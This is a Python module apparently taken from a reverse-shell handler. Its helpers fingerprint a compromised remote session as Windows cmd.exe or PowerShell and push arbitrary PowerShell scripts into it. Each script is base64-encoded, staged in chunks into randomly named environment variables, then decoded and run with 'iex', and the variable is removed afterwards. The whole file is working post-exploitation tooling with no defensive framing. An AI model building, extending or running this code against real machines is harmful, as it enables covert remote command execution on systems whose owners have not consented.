"""Windows reverse-shell client helpers — detection and PowerShell delivery."""

import base64
import secrets

WIN_PROBE_START = '__T_WIN_START__'
WIN_PROBE_END = '__T_WIN_END__'

_WINDOWS_TEXT_HINTS = (
    'windows', 'microsoft', 'c:\\windows', 'c:\\', 'cmd.exe', 'powershell',
    '[version', 'win32', 'x64-based pc', 'x86-based pc', 'nt kernel',
)


def infer_type_from_sysinfo(sysinfo: dict):
    """Infer shell type from a previously collected sysinfo snapshot."""
    if not sysinfo:
        return None
    os_name = (sysinfo.get('os') or '').lower()
    if sysinfo.get('powershell') or 'windows' in os_name:
        return 'windows'
    if sysinfo.get('python') or sysinfo.get('shell') or 'linux' in os_name or 'bsd' in os_name:
        return 'unix'
    return None


def text_suggests_windows(output: str) -> bool:
    text = (output or '').lower()
    return any(hint in text for hint in _WINDOWS_TEXT_HINTS)


def probe_windows_platform(handler, client_sock, timeout=4.0) -> bool:
    """Return True when the interactive session behaves like a Windows shell."""
    handler._flush_shell(client_sock, timeout=0.5)

    cmd = f"echo {WIN_PROBE_START} & ver & echo {WIN_PROBE_END}"
    if not handler.send_to_revshell(client_sock, cmd):
        return False
    out = handler.recv_output(client_sock, timeout=timeout, until_marker=WIN_PROBE_END)
    if WIN_PROBE_START in out and text_suggests_windows(out):
        return True

    handler._flush_shell(client_sock, timeout=0.5)
    cmd = (
        f"if exist %SystemRoot%\\System32\\cmd.exe "
        f"(echo {WIN_PROBE_START}WIN{WIN_PROBE_END})"
    )
    if not handler.send_to_revshell(client_sock, cmd):
        return False
    out = handler.recv_output(client_sock, timeout=timeout, until_marker=WIN_PROBE_END)
    return WIN_PROBE_START in out and 'WIN' in out


def detect_windows_shell_kind(handler, client_sock, timeout=2.5) -> str:
    """Detect whether the session is cmd.exe or an interactive PowerShell host."""
    handler._flush_shell(client_sock, timeout=0.3)
    if not handler.send_to_revshell(client_sock, 'echo %COMSPEC%'):
        return 'cmd'
    out = handler.recv_output(client_sock, timeout=timeout).lower()
    if 'powershell' in out:
        return 'powershell'
    if 'cmd.exe' in out:
        return 'cmd'
    if not handler.send_to_revshell(client_sock, f"echo {WIN_PROBE_START}%PSVersionTable% {WIN_PROBE_END}"):
        return 'cmd'
    out = handler.recv_output(client_sock, timeout=timeout, until_marker=WIN_PROBE_END)
    if 'System.Management.Automation' in out or 'PSVersionTable' in out:
        return 'powershell'
    return 'cmd'


def _stage_base64_cmd(var: str, chunk: str, idx: int) -> str:
    return f"set {var}={chunk}" if idx == 0 else f"set {var}=%{var}%{chunk}"


def _stage_base64_powershell(var: str, chunk: str, idx: int) -> str:
    esc = chunk.replace("'", "''")
    return f"$env:{var}='{esc}'" if idx == 0 else f"$env:{var}+='{esc}'"


def send_powershell_script(handler, client_sock, script, stage_timeout=3.0, shell_kind=None) -> bool:
    """
    Execute a PowerShell script on the remote Windows session.

    Small scripts use a single EncodedCommand. Larger scripts are staged in the
    *interactive* shell (cmd SET or PowerShell $env:) so variables persist, then
    executed in-process (PowerShell host) or via one child powershell.exe (cmd host).
    """
    cmd = handler._win_ps_cmd(script)
    if cmd:
        return handler.send_to_revshell(client_sock, cmd)

    info = handler._client_info(client_sock) or {}
    shell_kind = shell_kind or info.get('win_shell') or detect_windows_shell_kind(handler, client_sock)
    with handler.client_lock:
        cached = handler.revshell_clients.get(client_sock)
        if cached is not None:
            cached['win_shell'] = shell_kind

    encoded = base64.b64encode(script.encode('utf-16-le')).decode('ascii')
    var = f"T{secrets.token_hex(4)}"
    chunk_size = 3500
    chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]

    handler._flush_shell(client_sock, timeout=0.3)
    stage_fn = _stage_base64_powershell if shell_kind == 'powershell' else _stage_base64_cmd
    for idx, chunk in enumerate(chunks):
        if not handler.send_to_revshell(client_sock, stage_fn(var, chunk, idx)):
            return False
        handler.recv_output(client_sock, timeout=stage_timeout)

    if shell_kind == 'powershell':
        run_line = (
            f"$s=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($env:{var}));"
            f"Remove-Item Env:{var} -EA 0;iex $s"
        )
        return handler.send_to_revshell(client_sock, run_line)

    run_ps = (
        f"$s=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($env:{var}));"
        f"Remove-Item Env:{var} -EA 0;iex $s"
    )
    run_cmd = handler._win_ps_cmd(run_ps)
    if not run_cmd:
        return False
    return handler.send_to_revshell(client_sock, run_cmd)
